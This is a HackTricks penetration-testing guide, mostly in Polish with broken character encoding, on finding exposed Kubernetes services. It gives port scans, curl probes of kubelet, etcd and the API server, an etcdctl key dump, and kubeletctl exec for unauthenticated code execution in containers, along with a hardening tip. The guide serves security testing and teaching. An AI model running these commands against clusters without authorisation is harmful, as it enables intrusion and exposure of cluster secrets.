# Pentesting Kubernetes Services

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

Kubernetes uÅ¼ywa kilku **specyficznych usÅ‚ug sieciowych**, ktÃ³re moÅ¼esz znaleÅºÄ‡ **wystawione na Internet** lub w **sieci wewnÄ™trznej, gdy juÅ¼ skompromitujesz jeden pod**.

## Finding exposed pods with OSINT

Jednym ze sposobÃ³w moÅ¼e byÄ‡ wyszukiwanie `Identity LIKE "k8s.%.com"` w [crt.sh](https://crt.sh), aby znaleÅºÄ‡ subdomeny zwiÄ…zane z kubernetes. Innym sposobem moÅ¼e byÄ‡ wyszukiwanie `"k8s.%.com"` w githubie i szukanie **plikÃ³w YAML** zawierajÄ…cych ten ciÄ…g.

## How Kubernetes Exposes Services

MoÅ¼e byÄ‡ przydatne, abyÅ› zrozumiaÅ‚, jak Kubernetes moÅ¼e **wystawiaÄ‡ usÅ‚ugi publicznie**, aby je znaleÅºÄ‡:

{% content-ref url="../exposing-services-in-kubernetes.md" %}
[exposing-services-in-kubernetes.md](../exposing-services-in-kubernetes.md)
{% endcontent-ref %}

## Finding Exposed pods via port scanning

NastÄ™pujÄ…ce porty mogÄ… byÄ‡ otwarte w klastrze Kubernetes:

| Port            | Process        | Description                                                            |
| --------------- | -------------- | ---------------------------------------------------------------------- |
| 443/TCP         | kube-apiserver | Port API Kubernetes                                                    |
| 2379/TCP        | etcd           |                                                                        |
| 6666/TCP        | etcd           | etcd                                                                   |
| 4194/TCP        | cAdvisor       | Metryki kontenerÃ³w                                                   |
| 6443/TCP        | kube-apiserver | Port API Kubernetes                                                    |
| 8443/TCP        | kube-apiserver | Port API Minikube                                                    |
| 8080/TCP        | kube-apiserver | Niezabezpieczony port API                                            |
| 10250/TCP       | kubelet        | HTTPS API, ktÃ³ry pozwala na peÅ‚ny dostÄ™p                             |
| 10255/TCP       | kubelet        | Niezautoryzowany port HTTP tylko do odczytu: pod, dziaÅ‚ajÄ…ce pody i stan wÄ™zÅ‚a |
| 10256/TCP       | kube-proxy     | Serwer sprawdzania stanu Kube Proxy                                   |
| 9099/TCP        | calico-felix   | Serwer sprawdzania stanu dla Calico                                   |
| 6782-4/TCP      | weave          | Metryki i punkty koÅ„cowe                                             |
| 30000-32767/TCP | NodePort       | Proxy do usÅ‚ug                                                       |
| 44134/TCP       | Tiller         | UsÅ‚uga Helm nasÅ‚uchujÄ…ca                                            |

### Nmap

{% code overflow="wrap" %}
```bash
nmap -n -T4 -p 443,2379,6666,4194,6443,8443,8080,10250,10255,10256,9099,6782-6784,30000-32767,44134 <pod_ipaddress>/16
```
{% endcode %}

### Kube-apiserver

To jest **usÅ‚uga API Kubernetes**, z ktÃ³rÄ… administratorzy zazwyczaj komunikujÄ… siÄ™ za pomocÄ… narzÄ™dzia **`kubectl`**.

**Typowe porty: 6443 i 443**, ale takÅ¼e 8443 w minikube i 8080 jako nieszyfrowany.
```
curl -k https://<IP Address>:(8|6)443/swaggerapi
curl -k https://<IP Address>:(8|6)443/healthz
curl -k https://<IP Address>:(8|6)443/api/v1
```
**SprawdÅº nastÄ™pujÄ…cÄ… stronÄ™, aby dowiedzieÄ‡ siÄ™, jak uzyskaÄ‡ dostÄ™p do wraÅ¼liwych danych i wykonywaÄ‡ wraÅ¼liwe dziaÅ‚ania, rozmawiajÄ…c z tym serwisem:**

{% content-ref url="../kubernetes-enumeration.md" %}
[kubernetes-enumeration.md](../kubernetes-enumeration.md)
{% endcontent-ref %}

### Kubelet API

Ten serwis **dziaÅ‚a na kaÅ¼dym wÄ™Åºle klastra**. To serwis, ktÃ³ry **kontroluje** podsy w **wÄ™Åºle**. Komunikuje siÄ™ z **kube-apiserver**.

JeÅ›li znajdziesz ten serwis wystawiony, moÅ¼esz mieÄ‡ do czynienia z **nieautoryzowanym RCE**.

#### Kubelet API
```
curl -k https://<IP address>:10250/metrics
curl -k https://<IP address>:10250/pods
```
JeÅ›li odpowiedÅº to `Unauthorized`, oznacza to, Å¼e wymagana jest autoryzacja.

JeÅ›li moÅ¼esz wylistowaÄ‡ wÄ™zÅ‚y, moÅ¼esz uzyskaÄ‡ listÄ™ punktÃ³w koÅ„cowych kubeletÃ³w za pomocÄ…:
```bash
kubectl get nodes -o custom-columns='IP:.status.addresses[0].address,KUBELET_PORT:.status.daemonEndpoints.kubeletEndpoint.Port' | grep -v KUBELET_PORT | while IFS='' read -r node; do
ip=$(echo $node | awk '{print $1}')
port=$(echo $node | awk '{print $2}')
echo "curl -k --max-time 30 https://$ip:$port/pods"
echo "curl -k --max-time 30 https://$ip:2379/version" #Check  also for etcd
done
```
#### kubelet (Tylko do odczytu)
```
curl -k https://<IP Address>:10255
http://<external-IP>:10255/pods
```
### etcd API
```
curl -k https://<IP address>:2379
curl -k https://<IP address>:2379/version
etcdctl --endpoints=http://<MASTER-IP>:2379 get / --prefix --keys-only
```
### Tiller
```
helm --host tiller-deploy.kube-system:44134 version
```
MoÅ¼esz naduÅ¼yÄ‡ tej usÅ‚ugi, aby eskalowaÄ‡ uprawnienia w Kubernetes:

### cAdvisor

UsÅ‚uga przydatna do zbierania metryk.
```
curl -k https://<IP Address>:4194
```
### NodePort

Gdy port jest wystawiony na wszystkich wÄ™zÅ‚ach za pomocÄ… **NodePort**, ten sam port jest otwarty na wszystkich wÄ™zÅ‚ach, przekierowujÄ…c ruch do zadeklarowanej **UsÅ‚ugi**. DomyÅ›lnie port ten bÄ™dzie w **zakresie 30000-32767**. Tak wiÄ™c nowe, niekontrolowane usÅ‚ugi mogÄ… byÄ‡ dostÄ™pne przez te porty.
```
sudo nmap -sS -p 30000-32767 <IP>
```
## WraÅ¼liwe bÅ‚Ä™dne konfiguracje

### Kube-apiserver DostÄ™p anonimowy

DostÄ™p anonimowy do **kube-apiserver API endpoints nie jest dozwolony**. Ale moÅ¼esz sprawdziÄ‡ niektÃ³re punkty koÅ„cowe:

![](https://www.cyberark.com/wp-content/uploads/2019/09/Kube-Pen-2-fig-5.png)

### **Sprawdzanie dostÄ™pu anonimowego do ETCD**

ETCD przechowuje sekrety klastra, pliki konfiguracyjne i inne **wraÅ¼liwe dane**. **DomyÅ›lnie** ETCD **nie moÅ¼e** byÄ‡ dostÄ™pny **anonimowo**, ale zawsze warto to sprawdziÄ‡.

JeÅ›li ETCD moÅ¼e byÄ‡ dostÄ™pny anonimowo, moÅ¼e byÄ‡ konieczne **uÅ¼ycie** [**etcdctl**](https://github.com/etcd-io/etcd/blob/master/etcdctl/READMEv2.md) **narzÄ™dzia**. NastÄ™pujÄ…ce polecenie pobierze wszystkie przechowywane klucze:
```
etcdctl --endpoints=http://<MASTER-IP>:2379 get / --prefix --keys-only
```
### **Kubelet RCE**

Dokumentacja [**Kubelet**](https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet/) wyjaÅ›nia, Å¼e **domyÅ›lnie dostÄ™p anonimowy** do usÅ‚ugi jest **dozwolony:**

> UmoÅ¼liwia anonimowe Å¼Ä…dania do serwera Kubelet. Å»Ä…dania, ktÃ³re nie sÄ… odrzucane przez innÄ… metodÄ™ uwierzytelniania, sÄ… traktowane jako Å¼Ä…dania anonimowe. Å»Ä…dania anonimowe majÄ… nazwÄ™ uÅ¼ytkownika `system:anonymous` oraz nazwÄ™ grupy `system:unauthenticated`

Aby lepiej zrozumieÄ‡, jak dziaÅ‚a **uwierzytelnianie i autoryzacja API Kubelet**, sprawdÅº tÄ™ stronÄ™:

{% content-ref url="kubelet-authentication-and-authorization.md" %}
[kubelet-authentication-and-authorization.md](kubelet-authentication-and-authorization.md)
{% endcontent-ref %}

UsÅ‚uga **Kubelet** **API nie jest udokumentowana**, ale kod ÅºrÃ³dÅ‚owy moÅ¼na znaleÅºÄ‡ tutaj, a znalezienie wystawionych punktÃ³w koÅ„cowych jest tak proste jak **uruchomienie**:
```bash
curl -s https://raw.githubusercontent.com/kubernetes/kubernetes/master/pkg/kubelet/server/server.go | grep 'Path("/'

Path("/pods").
Path("/run")
Path("/exec")
Path("/attach")
Path("/portForward")
Path("/containerLogs")
Path("/runningpods/").
```
Wszystkie z nich brzmiÄ… interesujÄ…co.

MoÅ¼esz uÅ¼yÄ‡ narzÄ™dzia [**Kubeletctl**](https://github.com/cyberark/kubeletctl) do interakcji z Kubeletami i ich punktami koÅ„cowymi.

#### /pods

Ten punkt koÅ„cowy wyÅ›wietla listÄ™ podÃ³w i ich kontenerÃ³w:
```bash
kubeletctl pods
```
#### /exec

Ten punkt koÅ„cowy pozwala na bardzo Å‚atwe wykonywanie kodu wewnÄ…trz dowolnego kontenera:
```bash
kubeletctl exec [command]
```
{% hint style="info" %}
Aby uniknÄ…Ä‡ tego ataku, usÅ‚uga _**kubelet**_ powinna byÄ‡ uruchamiana z `--anonymous-auth false`, a usÅ‚uga powinna byÄ‡ segregowana na poziomie sieci.
{% endhint %}

### **Sprawdzanie ujawnienia informacji z Kubelet (Port tylko do odczytu)**

Gdy **port kubelet tylko do odczytu** jest ujawniony, moÅ¼liwe jest, aby nieautoryzowane strony uzyskaÅ‚y dostÄ™p do informacji z API. Ujawnienie tego portu moÅ¼e prowadziÄ‡ do ujawnienia rÃ³Å¼nych **elementÃ³w konfiguracji klastra**. ChociaÅ¼ informacje, w tym **nazwy podÃ³w, lokalizacje plikÃ³w wewnÄ™trznych i inne konfiguracje**, mogÄ… nie byÄ‡ krytyczne, ich ujawnienie nadal stanowi ryzyko bezpieczeÅ„stwa i powinno byÄ‡ unikane.

PrzykÅ‚ad, jak ta luka moÅ¼e byÄ‡ wykorzystana, polega na tym, Å¼e zdalny atakujÄ…cy uzyskuje dostÄ™p do konkretnego URL. PrzechodzÄ…c do `http://<external-IP>:10255/pods`, atakujÄ…cy moÅ¼e potencjalnie uzyskaÄ‡ wraÅ¼liwe informacje z kubelet:

![https://www.cyberark.com/wp-content/uploads/2019/09/KUbe-Pen-2-fig-6.png](https://www.cyberark.com/wp-content/uploads/2019/09/KUbe-Pen-2-fig-6.png)

## Referencje

{% embed url="https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-2" %}

{% embed url="https://labs.f-secure.com/blog/attacking-kubernetes-through-kubelet" %}

{% hint style="success" %}
Ucz siÄ™ i Ä‡wicz Hacking AWS:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Ucz siÄ™ i Ä‡wicz Hacking GCP: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie dla HackTricks</summary>

* SprawdÅº [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel siÄ™ trikami hackingowymi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriÃ³w github.

</details>
{% endhint %}
